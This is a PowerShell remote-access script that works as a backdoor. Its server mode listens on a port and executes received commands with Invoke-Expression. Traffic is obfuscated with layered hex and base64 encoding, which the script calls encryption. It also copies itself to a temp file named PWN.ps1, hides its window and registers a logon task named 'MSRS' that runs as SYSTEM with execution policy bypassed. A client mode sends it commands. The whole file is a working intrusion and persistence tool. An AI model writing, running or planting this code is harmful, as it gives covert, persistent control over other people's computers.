function Get-DeviceInformation {
    $deviceInfo = @{
        "Device Name" = $env:COMPUTERNAME
        "User Name" = $env:USERNAME
        "Private IP" = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback Pseudo-Interface 1" }).IPAddress
        "Public IP" = (Invoke-RestMethod -Uri "http://ifconfig.me").ToString()
        "Network Name" = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" }).InterfaceAlias
    }
    return $deviceInfo
}

function Display-Menu {
    Write-Host "==== Device Information ===="
    $deviceInfo = Get-DeviceInformation
    $deviceInfo.GetEnumerator() | ForEach-Object { Write-Host "$($_.Key): $($_.Value)" }
    Write-Host ""
    Write-Host "==== Menu ===="
    Write-Host "1. Run as Server"
    Write-Host "2. Run as Client"
    Write-Host "3. Exit"
    Write-Host "4. Set Execution Policy"
    Write-Host ""
    $choice = Read-Host "Enter your choice"
    return $choice
}

function Set-ExecutionPolicy {
    param (
        [string]$Policy
    )
    $command = "Set-ExecutionPolicy -ExecutionPolicy $Policy -Scope CurrentUser -Force"
    Invoke-Expression $command
    Write-Host "[+] Execution policy set to $Policy"
}

function ConvertTo-Hex {
    param ([byte[]]$data)
    return [System.BitConverter]::ToString($data) -replace '-', ''
}

function ConvertFrom-Hex {
    param ([string]$hex)
    $bytes = New-Object byte[] ($hex.Length / 2)
    for ($i = 0; $i -lt $hex.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
    }
    return $bytes
}

function TripleHexEncode {
    param ([byte[]]$data)
    for ($i = 0; $i -lt 3; $i++) {
        $data = [System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Hex -data $data))
    }
    return $data
}

function TripleHexDecode {
    param ([byte[]]$data)
    for ($i = 0; $i -lt 3; $i++) {
        $data = ConvertFrom-Hex -hex ([System.Text.Encoding]::UTF8.GetString($data))
    }
    return $data
}

function TripleBase64Encode {
    param ([byte[]]$data)
    for ($i = 0; $i -lt 3; $i++) {
        $data = [System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String($data))
    }
    return $data
}

function TripleBase64Decode {
    param ([byte[]]$data)
    for ($i = 0; $i -lt 3; $i++) {
        $data = [Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($data))
    }
    return $data
}

function BinaryEncode {
    param ([byte[]]$data)
    return [System.Text.Encoding]::UTF8.GetBytes([System.Text.Encoding]::UTF8.GetString($data))
}

function BinaryDecode {
    param ([byte[]]$data)
    return [System.Text.Encoding]::UTF8.GetBytes([System.Text.Encoding]::UTF8.GetString($data))
}

function Encrypt-Data {
    param ([string]$Data)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $dataBytes = TripleHexEncode -data $dataBytes
    $dataBytes = TripleBase64Encode -data $dataBytes
    $dataBytes = TripleHexEncode -data $dataBytes
    $dataBytes = BinaryEncode -data $dataBytes
    return [System.Text.Encoding]::UTF8.GetString($dataBytes)
}

function Decrypt-Data {
    param ([string]$Data)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $dataBytes = BinaryDecode -data $dataBytes
    $dataBytes = TripleHexDecode -data $dataBytes
    $dataBytes = TripleBase64Decode -data $dataBytes
    $dataBytes = TripleHexDecode -data $dataBytes
    return [System.Text.Encoding]::UTF8.GetString($dataBytes)
}

function Run-Server {
    param (
        [int]$Port
    )

    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $Port)
    $listener.Start()
    Write-Host "[+] Server started on port $Port. Waiting for connections..."

    while ($true) {
        $client = $listener.AcceptTcpClient()
        Write-Host "[+] Connection accepted from $($client.Client.RemoteEndPoint)"

        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        while ($true) {
            $encryptedCommand = $reader.ReadLine()
            $command = Decrypt-Data -Data $encryptedCommand
            if ($command -eq "exit") { break }

            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
                $encryptedOutput = Encrypt-Data -Data $output
                $writer.WriteLine($encryptedOutput)
            } catch {
                $errorOutput = "Error executing command: $_"
                $encryptedError = Encrypt-Data -Data $errorOutput
                $writer.WriteLine($encryptedError)
            }
        }

        $stream.Close()
        $client.Close()
    }
}

function Run-Client {
    param (
        [string]$ServerIP,
        [int]$ServerPort
    )

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ServerIP, $ServerPort)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        while ($true) {
            $command = Read-Host "Shell> "
            if ($command -eq "exit") { break }

            $encryptedCommand = Encrypt-Data -Data $command
            $writer.WriteLine($encryptedCommand)

            $encryptedResponse = $reader.ReadLine()
            $response = Decrypt-Data -Data $encryptedResponse
            Write-Host $response
        }

        $stream.Close()
        $client.Close()
    } catch {
        Write-Host "[-] Error: $_"
    }
}

function Clone-Script {
    param (
        [int]$ServerPort,
        [string]$FilePath
    )

    $scriptContent = @"
function ConvertTo-Hex {
    param ([byte[]]`$data)
    return [System.BitConverter]::ToString(`$data) -replace '-', ''
}

function ConvertFrom-Hex {
    param ([string]`$hex)
    `$bytes = New-Object byte[] (`$hex.Length / 2)
    for (`$i = 0; `$i -lt `$hex.Length; `$i += 2) {
        `$bytes[`$i / 2] = [Convert]::ToByte(`$hex.Substring(`$i, 2), 16)
    }
    return `$bytes
}

function TripleHexEncode {
    param ([byte[]]`$data)
    for (`$i = 0; `$i -lt 3; `$i++) {
        `$data = [System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Hex -data `$data))
    }
    return `$data
}

function TripleHexDecode {
    param ([byte[]]`$data)
    for (`$i = 0; `$i -lt 3; `$i++) {
        `$data = ConvertFrom-Hex -hex ([System.Text.Encoding]::UTF8.GetString(`$data))
    }
    return `$data
}

function TripleBase64Encode {
    param ([byte[]]`$data)
    for (`$i = 0; `$i -lt 3; `$i++) {
        `$data = [System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String(`$data))
    }
    return `$data
}

function TripleBase64Decode {
    param ([byte[]]`$data)
    for (`$i = 0; `$i -lt 3; `$i++) {
        `$data = [Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString(`$data))
    }
    return `$data
}

function BinaryEncode {
    param ([byte[]]`$data)
    return [System.Text.Encoding]::UTF8.GetBytes([System.Text.Encoding]::UTF8.GetString(`$data))
}

function BinaryDecode {
    param ([byte[]]`$data)
    return [System.Text.Encoding]::UTF8.GetBytes([System.Text.Encoding]::UTF8.GetString(`$data))
}

function Encrypt-Data {
    param ([string]`$Data)
    `$dataBytes = [System.Text.Encoding]::UTF8.GetBytes(`$Data)
    `$dataBytes = TripleHexEncode -data `$dataBytes
    `$dataBytes = TripleBase64Encode -data `$dataBytes
    `$dataBytes = TripleHexEncode -data `$dataBytes
    `$dataBytes = BinaryEncode -data `$dataBytes
    return [System.Text.Encoding]::UTF8.GetString(`$dataBytes)
}

function Decrypt-Data {
    param ([string]`$Data)
    `$dataBytes = [System.Text.Encoding]::UTF8.GetBytes(`$Data)
    `$dataBytes = BinaryDecode -data `$dataBytes
    `$dataBytes = TripleHexDecode -data `$dataBytes
    `$dataBytes = TripleBase64Decode -data `$dataBytes
    `$dataBytes = TripleHexDecode -data `$dataBytes
    return [System.Text.Encoding]::UTF8.GetString(`$dataBytes)
}

function Run-Server {
    param (
        [int]`$Port
    )

    `$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, `$Port)
    `$listener.Start()
    Write-Host "[+] Server started on port `$Port. Waiting for connections..."

    while (`$true) {
        `$client = `$listener.AcceptTcpClient()
        Write-Host "[+] Connection accepted from `$(\$client.Client.RemoteEndPoint)"

        `$stream = `$client.GetStream()
        `$reader = New-Object System.IO.StreamReader(`$stream)
        `$writer = New-Object System.IO.StreamWriter(`$stream)
        `$writer.AutoFlush = `$true

        while (`$true) {
            `$encryptedCommand = `$reader.ReadLine()
            `$command = Decrypt-Data -Data `$encryptedCommand
            if (`$command -eq "exit") { break }

            try {
                `$output = Invoke-Expression `$command 2>&1 | Out-String
                `$encryptedOutput = Encrypt-Data -Data `$output
                `$writer.WriteLine(`$encryptedOutput)
            } catch {
                `$errorOutput = "Error executing command: `$_"
                `$encryptedError = Encrypt-Data -Data `$errorOutput
                `$writer.WriteLine(`$encryptedError)
            }
        }

        `$stream.Close()
        `$client.Close()
    }
}

Run-Server -Port $ServerPort
"@

    Set-Content -Path $FilePath -Value $scriptContent
}

function Add-To-Startup {
    param (
        [string]$FilePath
    )

    $taskName = "MSRS"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$FilePath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal
}

function Run-In-Background {
    param (
        [string]$FilePath
    )

    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$FilePath`"" -WindowStyle Hidden
}

while ($true) {
    $choice = Display-Menu
    switch ($choice) {
        "1" {
            $port = [int](Read-Host "Enter the port to listen on")
            $userName = $env:USERNAME
            $filePath = "C:\Users\$userName\AppData\Local\Temp\PWN.ps1"
            New-Item -ItemType Directory -Force -Path "C:\Users\$userName\AppData\Local\Temp" | Out-Null
            Clone-Script -ServerPort $port -FilePath $filePath
            Add-To-Startup -FilePath $filePath
            Run-In-Background -FilePath $filePath
            Write-Host "[+] Script cloned, added to startup, and running in the background."
            Run-Server -Port $port
            break
        }
        "2" {
            $serverIP = Read-Host "Enter the server IP"
            $serverPort = [int](Read-Host "Enter the server port")
            Run-Client -ServerIP $serverIP -ServerPort $serverPort
            break
        }
        "3" {
            Write-Host "Exiting..."
            break
        }
        "4" {
            $policy = Read-Host "Enter execution policy (RemoteSigned or Bypass)"
            Set-ExecutionPolicy -Policy $policy
            break
        }
        default {
            Write-Host "Invalid choice. Please try again."
        }
    }
    if ($choice -eq "3") { break }
}
